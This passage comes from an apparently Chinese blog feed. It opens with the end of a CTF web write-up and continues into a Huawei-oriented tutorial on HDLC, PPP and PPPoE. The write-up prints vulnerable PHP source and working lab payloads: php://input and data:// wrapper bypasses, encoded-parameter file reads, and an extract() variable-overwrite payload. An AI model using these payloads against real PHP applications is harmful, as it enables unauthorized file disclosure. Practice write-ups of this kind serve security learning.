code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;user&quot;</span>];    <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$user</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$user</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the Bili&#x27;s world&quot;</span>))&#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello Bili_friend!&lt;br&gt;&quot;</span>;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;*******&#125;&quot;</span>;<br>&#125; <br></code></pre></div></td></tr></table></figure><p>通过代码的阅读，想到了使用伪协议绕过</p><p>通过查询</p><p>构造?user=php://input在post部分添加welcome to the Bili’s world</p><p>或者?user=data://test/plain,welcome+to+the+Bili’s+world</p><p>得到flag：flag{Y0u_aRe_G0og!} </p><h1 id="5-LX-web4"><a href="#5-LX-web4" class="headerlink" title="5.LX web4"></a>5.LX web4</h1><p>访问<a href="http://host:port/LX/web4/index.php">http://host:port/LX/web4/index.php</a></p><p>得到如下回显</p><p><img src="https://pic.imgdb.cn/item/60f6d8145132923bf8462a32.png"></p><p>通过对源码的查看发现隐藏了一个ver，获取版本查看返回的报文即可，该版本是PHP/5.4.41</p><p>尝试全部填写5.4.41无回显，尝试目录扫描后发现有index.php.bak文件，下载后，通过阅读代码，发现get可以上传ver的值。</p><p>此时加上get的ver=5.4.41</p><p>得到flag：flag{Y3ah,y0u_g3t_th3_flag}</p><h1 id="6-ddctf"><a href="#6-ddctf" class="headerlink" title="6. ddctf"></a>6. ddctf</h1><p>访问<a href="http://host:port/web/ddctf/">http://host:port/web/ddctf/</a></p><p>跳转界面，按照内容跳转。</p><p>得到一个图片的界面，且有标题，对跳转的参数，尝试破解。</p><p>进行两次base64解码后得到一串字母最大为e的，推断是16进制转字符。最后转换后得到flag.jpg。</p><p>编写转换的工具</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment"># 输入需要转化的内容并转换为16进制</span><br>nr=binascii.hexlify(<span class="hljs-string">b&#x27;index.php&#x27;</span>)<br><span class="hljs-comment"># 得到16进制</span><br>nr=<span class="hljs-built_in">str</span>(nr,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-comment">#进行两次base64编码</span><br>re=base64.b64encode(nr.encode())<br>re=base64.b64encode(re)<br><span class="hljs-built_in">print</span>(nr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(re,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></div></td></tr></table></figure><p>得到index.php的编码</p><blockquote><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p></blockquote><p>传入参数得到index.php的源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80913909</span><br><span class="hljs-comment"> * Date: July 4,2018</span><br><span class="hljs-comment"> */</span><br>error_reporting(E_ALL || ~E_NOTICE);<br> <br> <br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;jpg&#x27;</span>]))<br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);<br><span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;jpg&#x27;</span>])));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;jpg&#x27;</span>].<span class="hljs-string">&#x27;&lt;/title&gt;&#x27;</span>;<br><span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="hljs-variable">$txt</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Can you find the flag file?</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>根据代码，首先是内容必须是字母及数字</p><p>其次config会被转化为!</p><p>注意到第一行有链接，点进去后发现是备份文件。参数各种flag.swp等等无果后尝试文章中其中的**.practice.txt.swp**</p><p>解码后得到f1ag!ddctf.php文件</p><p>尝试继续读取其中的内容</p><p>发现无回显，但是都能够访问了。此时注意到其中有一个感叹号，不满足要求。但是可以通过config转化为!</p><p>对f1agconfigddctf.php编译后传入访问。对内容解码后</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-variable">$k</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$uid</span>))<br>&#123;<br>    <span class="hljs-variable">$content</span>=trim(file_get_contents(<span class="hljs-variable">$k</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$uid</span>==<span class="hljs-variable">$content</span>)<br>        &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;hello&#x27;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>此时有函数extract涉及到变量覆盖，通过查询使用参数后不带内容即可</p><p>f1ag!ddctf.php?k=&amp;uid=</p><p>最后得到flag：flag{DDCTF_Ex1mpl1!!!}</p><p>在目录扫描时发现有文件config.php~和index.php~，其中可直接获取flag</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>rce</tag>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HDLC和PPP,PPPoE原理与配置</title>
    <link href="/2021/07/20/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E5%B9%BF%E5%9F%9F%E7%BD%91%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/HDLC%E5%92%8CPPP,PPPoE%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/07/20/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E5%B9%BF%E5%9F%9F%E7%BD%91%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/HDLC%E5%92%8CPPP,PPPoE%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="HDLC和PPP-PPPoE原理与配置"><a href="#HDLC和PPP-PPPoE原理与配置" class="headerlink" title="HDLC和PPP,PPPoE原理与配置"></a>HDLC和PPP,PPPoE原理与配置</h1><h2 id="1-HDLC和PPP原理与配置"><a href="#1-HDLC和PPP原理与配置" class="headerlink" title="1.HDLC和PPP原理与配置"></a>1.HDLC和PPP原理与配置</h2><h3 id="1-1-串行链路的数据传输方式"><a href="#1-1-串行链路的数据传输方式" class="headerlink" title="1.1 串行链路的数据传输方式"></a>1.1 串行链路的数据传输方式</h3><ul><li>串行链路普遍用于广域网中。串行链路中定义了两种数据传输方式∶异步和同步<ol><li>异步传输是以字节为单位来传输数据，并且需要采用额外的起始位和停止位来标记每个字节的开始和结束。起始位为二进制值0，停止位为二进制值1。在这种传输方式下，开始和停止位占据发送数据的相当大的比例，每个字节的发送都需要额外的开销</li><li>同步传输是以帧为单位来传输数据，在通信时需要使用时钟来同步本端和对端的设备通信。DCE即数据通信设备，它提供了一个用于同步DCE设备和DTE设备之间数据传输的时钟信号。DTE即数据终端设备，它通常使用DCE产生的时钟信号</li></ol></li></ul><h3 id="1-2-HDLC协议应用"><a href="#1-2-HDLC协议应用" class="headerlink" title="1.2 HDLC协议应用"></a>1.2 HDLC协议应用</h3><p>ISO制定的HDLC是一种面向比特的通信规则。HDLC传送的信息单位为帧。作为面向比特的同步数据控制协议的典型，HDLC具有如下特点：</p><ol><li>协议不依赖于任何一种字符编码集</li><li>数据报文可透明传输，用于透明传输的“0比特插入法”易于硬件实现</li><li>全双工通信，不必等待确认可连续发送数据，有较高的数据链路传输效率</li><li>所有帧均采用CRC校验，并对信息帧进行编号，可防止漏收或重收，传输可靠性高</li><li>传输控制功能与处理功能分离，具有较大的灵活性和较完善的控制功能</li></ol><h3 id="1-3-HDLC帧结构"><a href="#1-3-HDLC帧结构" class="headerlink" title="1.3 HDLC帧结构"></a>1.3 HDLC帧结构</h3><p><img src="https://pic.imgdb.cn/item/60f66a865132923bf8a8a5b8.png"></p><ul><li><p>完整的HDLC帧由标志字段(F)、地址字段(A)、控制字段(C)、信息字段(I)、帧校验序列字段(FCS)等组成</p><ol><li><p>标志字段为01111110，用以标志帧的开始与结束，也可以作为帧与帧之间的填充字符</p></li><li><p>地址字段携带的是地址信息</p></li><li><p>控制字段用于构成各种命令及响应，以便对链路进行监视与控制。发送方利用控制字段来通知接收方来执行约定的操作;相反，接收方用该字段作为对命令的响应，报告已经完成的操作或状态的变化</p></li><li><p>信息字段可以包含任意长度的二进制数，其上限由FCS字段或通讯节点的缓存容量来决定，目前用得较多的是1000-2000比特，而下限可以是0，即无信息字段。监控帧中不能有信息字段</p></li><li><p>帧检验序列字段可以使用16位CRC对两个标志字段之间的内容进行校验</p></li></ol></li><li><p>HDLC有三种类型的帧：</p><ol><li>信息帧(I帧)用于传送有效信息或数据，通常简称为I帧</li><li>监控帧（S帧）用于差错控制和流量控制，通常称为S帧。S帧的标志是控制字段的前两个比特位为“10”。S帧不带信息字段，只有6个字节即48个比特</li><li>无编号帧(U帧)简称U帧。U帧用于提供对链路的建立、拆除以及多种控制功能</li></ol></li></ul><h3 id="1-4-HDLC基本配置"><a href="#1-4-HDLC基本配置" class="headerlink" title="1.4 HDLC基本配置"></a>1.4 HDLC基本配置</h3><p>用户只需要在串行接口视图下运行<code>link-protocol hdlc</code>命令就可以使能接口的HDLC协议华为设备上的串行接口默认运行PPP协议。用户必须在串行链路两端的端口上配置相同的链路协议，双方才能通信</p><h3 id="1-5-HDLC-接口地址借用"><a href="#1-5-HDLC-接口地址借用" class="headerlink" title="1.5 HDLC 接口地址借用"></a>1.5 HDLC 接口地址借用</h3><ul><li><p>一个接口如果没有IP地址就无法生成路由，也就无法转发报文。IP地址借用允许一个没有IP地址的接口从其它接口借用P地址。这样可以避免一个接口独占IP地址，节省IP地址资源。一般建议借用loopback接口的IP地址，因为这类接口总是处于活跃( active )状态，因而能提供稳定可用的P地址</p></li><li><p>本例中</p><p><img src="https://pic.imgdb.cn/item/60f66b6b5132923bf8ac4ea6.png"></p><p>在RTA的S1/0/0接口配置完接口地址借用之后，还需要在RTA上配置静态路由，以使RTA能够转发数据到10.1.1.0/24网络</p></li></ul><h3 id="1-6-配置验证"><a href="#1-6-配置验证" class="headerlink" title="1.6 配置验证"></a>1.6 配置验证</h3><p>执行<code>display ip interface brief</code>命令可以查看路由器接口简要信息。如果有IP地址被借用，该IP地址会显示在多个接口上，说明借用loopback接口的IP地址成功</p><h3 id="1-7-PPP协议应用"><a href="#1-7-PPP协议应用" class="headerlink" title="1.7 PPP协议应用"></a>1.7 PPP协议应用</h3><p>PPP协议是一种点到点链路层协议，主要用于在全双工的同异步链路上进行点到点的数据传输。PPP协议有如下优点：</p><ol><li>PPP既支持同步传输又支持异步传输，而X.25、FR ( Frame Relay)等数据链路层协议仅支持同步传输，SLIP仅支持异步传输</li><li>PPP协议具有很好的扩展性，例如，当需要在以太网链路上承载PPP协议时，PPP可以扩展为PPPoE</li><li>PPP提供了LCP ( Link Control Protocol）协议，用于各种链路层参数的协商</li><li>PPP提供了各种NCP ( Network Control Protocol )协议（如IPCP、IPXCP)，用于各网络层参数的协商，更好地支持了网络层协议</li><li>PPP提供了认证协议：CHAP ( Challenge-Handshake Authentication Protocol ) .PAP ( Password Authentication Protocol)，更好的保证了网络的安全性</li><li>无重传机制，网络开销小，速度快</li></ol><h3 id="1-8-PPP组件"><a href="#1-8-PPP组件" class="headerlink" title="1.8 PPP组件"></a>1.8 PPP组件</h3><ul><li>PPP包含两个组件：链路控制协议LCP和网络层控制协议NCP</li><li>为了能适应多种多样的链路类型，PPP定义了链路控制协议LCP。LCP可以自动检测链路环境，如是否存在环路;协商链路参数，如最大数据包长度，使用何种认证协议等等。与其他数据链路层协议相比，PPP协议的一个重要特点是可以提供认证功能，链路两端可以协商使用何种认证协议来实施认证过程，只有认证成功之后才会建立连接</li><li>PPP定义了一组网络层控制协议NCP，每一个NCP对应了一种网络层协议，用于协商网络层地址等参数，例如IPCP用于协商控制IP协议，IPXCP用于协商控制IPX协议等</li></ul><h3 id="1-9-PPP链路建立过程"><a href="#1-9-PPP链路建立过程" class="headerlink" title="1.9 PPP链路建立过程"></a>1.9 PPP链路建立过程</h3><p>对于PPP链路建立过程的描述如下：</p><ol><li>Dead阶段也称为物理层不可用阶段。当通信双方的两端检测到物理线路激活时，就会从Dead阶段迁移至Establish阶段，即链路建立阶段</li><li>在Establish阶段，PPP链路进行LCP参数协商。协商内容包括最大接收单元MRU、认证方式、魔术字(Magic Number )等选项。LCP参数协商成功后会进入Opened状态，表示底层链路已经建立</li><li>多数情况下,链路两端的设备是需要经过认证阶段(Authenticate )后才能够进入到网络层协议阶段。PPP链路在缺省情况下是不要求进行认证的。如果要求认证，则在链路建立阶段必须指定认证协议。认证方式是在链路建立阶段双方进行协商的。如果在这个阶段再次收到了Configure-Request报文，则又会返回到链路建立阶段</li><li>在Network阶段，PPP链路进行NCP协商。通过NCP协商来选择和配置一个网络层协议并进行网络层参数协商。只有相应的网络层协议协商成功后，该网络层协议才可以通过这条PPP链路发送报文。如果在这个阶段收到了Configure-Request报文，也会返回到链路建立阶段</li><li>NCP协商成功后，PPP链路将保持通信状态。PPP运行过程中，可以随时中断连接，例如物理链路断开、认证失败、超时定时器时间、管理员通过配置关闭连接等动作都可能导致链路进入Terminate阶段</li><li>在Terminate阶段，如果所有的资源都被释放，通信双方将回到Dead阶段，直到通信双方重新建立PPP连接</li></ol><h3 id="1-10-PPP帧格式"><a href="#1-10-PPP帧格式" class="headerlink" title="1.10 PPP帧格式"></a>1.10 PPP帧格式</h3><p><img src="https://pic.imgdb.cn/item/60f66c6b5132923bf8b09cc0.png"></p><p>PPP采用了与HDLC协议类似的帧格式：</p><ul><li>Flag域标识一个物理帧的起始和结束，该字节为二进制序列01111110 ( 0X7E)</li><li>PPP帧的地址域跟HDLC帧的地址域有差异，PPP帧的地址域字节固定为11111111(0XFF )，是一个广播地址</li><li>PPP数据帧的控制域默认为00000011(0X03)，表明为无序号帧。帧校验序列(FCS )是个16位的校验和，用于检查PPP帧的完整性</li><li>协议字段用来说明PPP所封装的协议报文类型，典型的字段值有：0XC021代表LCP报文，0XC023代表PAP报文，0XC223代表CHAP报文</li><li>信息字段包含协议字段中指定协议的数据包。数据字段的默认最大长度(不包括协议字段)称为最大接收单元MRU (Maximum Receive Unit ) ，MRU的缺省值为1500字节</li><li>如果协议字段被设为0XC021，则说明通信双方正通过LCP报文进行PPP链路的协商和建立：</li><li>Code字段，主要是用来标识LCP数据报文的类型。典型的报文类型有︰配置信息报文( Configure Packets： 0x01)，配置成功信息报文(Configure-Ack：0X02)，终止请求报文(Terminate-Request ： 0X05)</li><li>Identifier域为1个字节，用来匹配请求和响应。Length域的值就是该LCP报文的总字节数据</li><li>数据字段则承载各种TLV( Type/Length/Nalue )参数用于协商配置选项，包括最大接收单元，认证协议等等</li></ul><h3 id="1-11-LCP-报文"><a href="#1-11-LCP-报文" class="headerlink" title="1.11 LCP 报文"></a>1.11 LCP 报文</h3><table><thead><tr><th>报文类型</th><th>作用</th></tr></thead><tbody><tr><td>Configure-Request</td><td>包含发生在试图与对端建立连接时使用的参数列表</td></tr><tr><td>Configure-Ack</td><td>表示完全接收对端发送的Configure-Request的参数取值</td></tr><tr><td>Configure-Nak</td><td>表示对端发送的Configure-Request中的某些参数取值在本端不被认可</td></tr><tr><td>Configure-Reject</td><td>表示对端发送的Configure-Request中的某些参数本端不能识别</td></tr></tbody></table><p>此表格列出了LCP用于链路层参数协商所使用四种报文类型</p><ol><li>Configure-Request(配置请求)：链路层协商过程中发送的第一个报文，该报文表明点对点双方开始进行链路层参数的协商</li><li>Configure-Ack (配置响应)：收到对端发来的Configure-Request报文，如果参数取值完全接受，则以此报文响应</li><li>Configure-Nak(配置不响应)：收到对端发来的Configure-Request报文，如果参数取值不被本端认可，则发送此报文并且携带本端可接受的配置参数</li><li>Configure-Reject(配置拒绝)：收到对端发来的Configure-Request报文，如果本端不能识别对端发送的Configure-Request中的某些参数，则发送此报文并且携带那些本端不能认别的配置参数</li></ol><h3 id="1-12-LCP协商参数"><a href="#1-12-LCP协商参数" class="headerlink" title="1.12 LCP协商参数"></a>1.12 LCP协商参数</h3><ul><li><p>LCP报文携带的一些常见的配置参数有MRU，认证协议，以及魔术字</p><ol><li><p>在VRP平台上，MRU参数使用接口上配置的最大传输单元(MTU)值来表示</p></li><li><p>常用的PPP认证协议有PAP和CHAP，一条PPP链路的两端可以使用不同的认证协议认证对端，但是被认证方必须支持认证方要求使用的认证协议并正确配置用户名和密码等认证信息</p></li><li><p>LCP使用魔术字来检测链路环路和其它异常情况。魔术字为随机产生的一个数字，随机机制需要保证两端产生相同魔术字的可能性几乎为0</p></li></ol></li><li><p> 收到一个Configure-Request报文之后，其包含的魔术字需要和本地产生的魔术字做比较，如果不同，表示链路无环路，则使用Confugure-Ack报文确认（其它参数也协商成功），表示魔术字协商成功。在后续发送的报文中，如果报文含有魔术字字段，则该字段设置为协商成功的魔术字</p></li></ul><h3 id="1-13-LCP链路参数协商"><a href="#1-13-LCP链路参数协商" class="headerlink" title="1.13 LCP链路参数协商"></a>1.13 LCP链路参数协商</h3><p><img src="https://pic.imgdb.cn/item/60f66e4f5132923bf8b84374.png"></p><ul><li>如图所示，RTA和RTB使用串行链路相连，运行PPP。当物理层链路变为可用状态之后，RTA和RTB使用LCP协商链路参数</li><li>本例中，RTA首先发送一个Configure-Request报文，此报文中包含RTA上配置的链路层参数。当RTB收到此Configure-Request报文之后，如果RTB能识别并接受此报文中的所有链路层参数，则向RTA回应一个Configure-Ack报文</li><li>RTA在没有收到Configure-Ack报文的情况下，会每隔3秒重传一次Configure-Request报文，如果连续10次发送Configure-Request报文仍然没有收到Configure-Ack报文，则认为对端不可用，停止发送Configure-Request报文</li><li>注∶完成上述过程只是表明RTB认为RTA上的链路参数配置是可接受的。RTB也需要向RTA发送Configure-Request报文，使RTA检测RTB上的链路参数是不是可接受的</li><li>当RTB收到RTA发送的Configure-Request报文之后，如果RTB能识别此报文中携带的所有链路层参数，但是认为部分或全部参数的取值不能接受，即参数的取值协商不成功，则RTB需要向RTA回应一个Configure-Nak报文</li><li>在这个Configure-Nak报文中，只包含不能接受的链路层参数，并且此报文所包含的链路层参数均被修改为RTB上可以接受的取值（或取值范围)</li><li>在收到Configure-Nak报文之后，RTA需要根据此报文中的链路层参数重新选择本地配置的其它参数，并重新发送一个Configure-Request</li><li>当RTB收到RTA发送的Configure-Request报文之后，如果RTB不能识别此报文中携带的部分或全部链路层参数，则RTB需要向RTA回应一个Configure-Reject报文。在此<br>Configure-Reject报文中，只包含不能被识别的链路层参数</li><li>在收到Configure-Reject报文之后，RTA需要向RTB重新发送一个Configure-Request报文，在新的Configure-Request报文中，不再包含不被对端(RTB)识别的参数</li></ul><h3 id="1-14-PPP基本配置"><a href="#1-14-PPP基本配置" class="headerlink" title="1.14 PPP基本配置"></a>1.14 PPP基本配置</h3><p>建立PPP链路之前，必须先在串行接口上配置链路层协议。华为ARG3系列路由器默认在串行接口上使能PPP协议。如果接口运行的不是PPP协议，需要运行<code>link-protocol ppp</code>命令来使能数据链路层的PPP协议</p><h3 id="1-15-PPP认证模式-PAP"><a href="#1-15-PPP认证模式-PAP" class="headerlink" title="1.15 PPP认证模式-PAP"></a>1.15 PPP认证模式-PAP</h3><ul><li>PAP认证的工作原理较为简单。PAP认证协议为两次握手认证协议，密码以明文方式在链路上发送</li><li>LCP协商完成后，认证方要求被认证方使用PAP进行认证</li><li>被认证方将配置的用户名和密码信息使用Authenticate-Request报文以明文方式发送给认证方</li><li>认证方收到被认证方发送的用户名和密码信息之后，根据本地配置的用户名和密码数据库检查用户名和密码信息是否匹配，如果匹配，则返回Authenticate-Ack报文，表示认证成功。否则，返回Authenticate-Nak报文，表示认证失败</li></ul><h3 id="1-16-PPP认证模式-CHAP"><a href="#1-16-PPP认证模式-CHAP" class="headerlink" title="1.16 PPP认证模式-CHAP"></a>1.16 PPP认证模式-CHAP</h3><ul><li>CHAP认证过程需要三次报文的交互。为了匹配请求报文和回应报文，报文中含有Identifier字段，一次认证过程所使用的报文均使用相同的Identifier信息<ol><li>LCP协商完成后，认证方发送一个Challenge报文给被认证方，报文中含有Identifier信息和一个随机产生的Challenge字符串，此Identifier即为后续报文所使用的Identifier</li><li>被认证方收到此Challenge报文之后，进行一次加密运算，运算公式为MD5{ Identifier+密码+Challenge }，意思是将Identifier、密码和Challenge三部分连成一个字符串，然后对此字符串做MD5运算，得到一个16字节长的摘要信息，然后将此摘要信息和端口上配置的CHAP用户名一起封装在Response报文中发回认证方</li><li>认证方接收到被认证方发送的Response报文之后，按照其中的用户名在本地查找相应的密码信息，得到密码信息之后，进行一次加密运算，运算方式和被认证方的加密运算方式相同，然后将加密运算得到的摘要信息和Response报文中封装的摘要信息做比较，相同则认证成功，不相同则认证失败</li></ol></li><li>使用CHAP认证方式时，被认证方的密码是被加密后才进行传输的，这样就极大的提高了安全性</li></ul><h3 id="1-17-IPCP静态地址协商"><a href="#1-17-IPCP静态地址协商" class="headerlink" title="1.17 IPCP静态地址协商"></a>1.17 IPCP静态地址协商</h3><ul><li><p>IPCP使用和LCP相同的协商机制、报文类型，但IPCP并非调用LCP，只是工作过程、报文等和LCP相同</p></li><li><p>IP地址协商包括两种方式：静态配置协商和动态配置协商</p></li><li><p>如图所示</p><p><img src="https://pic.imgdb.cn/item/60f66f3e5132923bf8bc1e01.png"></p></li><li><p>两端路由器配置的IP地址分别为10.1.1.1/30和10.1.1.2/30</p></li><li><p>静态IP地址的协商过程如下：</p><ol><li>每一端都要发送Configure-Request报文，在此报文中包含本地配置的IP地址</li><li>每一端接收到此Configure-Request报文之后，检查其中的IP地址，如果IP地址是一个合法的单播IP地址，而且和本地配置的IP地址不同（没有IP冲突），则认为对端可以使用该地址，回应一个Configure-Ack报文</li></ol></li><li><p>两端动态协商IP地址的过程如下：</p><p><img src="https://pic.imgdb.cn/item/60f66fa45132923bf8bdb467.png"></p><ol><li>RTA向RTB发送一个Configure-Request报文，此报文中会包含一个IP地址0.0.0.0，表示向对端请求IP地址</li><li>RTB收到上述Configure-Request报文后，认为其中包含的地址（0.0.0.0)不合法，使用Configure-Nak回应一个新的IP地址10.1.1.1 </li><li>RTA收到此Configure-Nak报文之后，更新本地IP地址，并重新发送一个Configure-<br>Request报文，包含新的IP地址10.1.1.1 </li><li>RTB收到Configure-Request报文后，认为其中包含的IP地址为合法地址，回应一个<br>Configure-Ack报文</li></ol></li><li><p>同时，RTB也要向RTA发送Configure-Request报文请求使用地址10.1.1.2，RTA认为此地址合法，回应Configure-Ack报文</p></li></ul><h3 id="1-18-PAP-认证"><a href="#1-18-PAP-认证" class="headerlink" title="1.18 PAP 认证"></a>1.18 PAP 认证</h3><ul><li><code>local-user huawei password cipher huawei123</code>命令用于创建一个本地用户，用户名为“huawei”，密码为“huawei123”，关键字“cipher”表示密码信息在配置文件中被加密</li><li><code>local-user huawei service-type ppp</code>命令用于设置用户“huawei”为PPP用户</li><li><code>ppp authentication-mode pap</code>命令用于在认证方开启PAP认证的功能，即要求对端使用PAP认证</li><li><code>ppp pap local-user huawei password cipher huawei123</code>命令用于在被认证方配置PAP使用的用户名和密码信息</li></ul><h3 id="1-19-配置验证"><a href="#1-19-配置验证" class="headerlink" title="1.19 配置验证"></a>1.19 配置验证</h3><p>命令<code>debugging ppp pap all</code></p><h3 id="1-20-配置CHAP认证模式"><a href="#1-20-配置CHAP认证模式" class="headerlink" title="1.20 配置CHAP认证模式"></a>1.20 配置CHAP认证模式</h3><ul><li><code>local-user huawei password cipher huawei123</code>命令用于创建一个本地用户，用户名为“huawei”，密码为“huawei123”;关键字“cipher”表示密码信息在配置文件中加密保存</li><li><code>local-user huawei service-type ppp</code>命令用于设置用户“huawei”为PPP用户</li><li><code>ppp authentication-mode chap</code>命令用于在认证方开启CHAP认证的功能，即要求对端使用CHAP认证</li><li><code>ppp chap user huawei</code>命令用于在被认证方设置CHAP使用的用户名为“huawei”</li><li><code>ppp chap password cipher huawei123</code>命令用于在被认证方设置CHAP使用的密码为”huawei123”</li><li>验证使用命令<code>debugging ppp chap all</code></li></ul><h2 id="2-PPPoE原理和配置"><a href="#2-PPPoE原理和配置" class="headerlink" title="2. PPPoE原理和配置"></a>2. PPPoE原理和配置</h2><h3 id="2-1-DSL-应用场景"><a href="#2-1-DSL-应用场景" class="headerlink" title="2.1 DSL 应用场景"></a>2.1 DSL 应用场景</h3><ul><li>DSL是一种利用现有电话网络实现数据通信的宽带技术。在使用DSL接入网络时，用户侧会安装调制解调器，然后通过现有的电话线与数字用户线路接入复用器(DSLAM)相连。DSLAM是各种DSL系统的局端设备，属于最后一公里接入设备</li><li>然后，DSLAM通过高速ATM网络或者以太网将用户的数据流量转发给宽带远程接入服务器(BRAS)。BRAS是面向宽带网络应用的接入网关，位于骨干网的边缘层</li></ul><h3 id="2-2-PPPoE在DSL中的应用"><a href="#2-2-PPPoE在DSL中的应用" class="headerlink" title="2.2 PPPoE在DSL中的应用"></a>2.2 PPPoE在DSL中的应用</h3><ul><li>运营商希望通过同一台接入设备来连接远程的多个主机，同时接入设备能够提供访问控制和计费功能。在众多的接入技术中，把多个主机连接到接入设备的最经济的方法就是以太网，而PPP协议可以提供良好的访问控制和计费功能，于是产生了在以太网上传输PPP报文的技术，即PPPoE</li><li>PPPoE利用以太网将大量主机组成网络，通过一个远端接入设备连入因特网，并运用PPP协议对接入的每个主机进行控制，具有适用范围广、安全性高、计费方便的特点</li><li>PPPoE技术解决了用户上网收费等实际应用问题，得到了宽带接入运营商的认可并被广泛应用</li></ul><h3 id="2-3-PPPoE报文"><a href="#2-3-PPPoE报文" class="headerlink" title="2.3 PPPoE报文"></a>2.3 PPPoE报文</h3><p><img 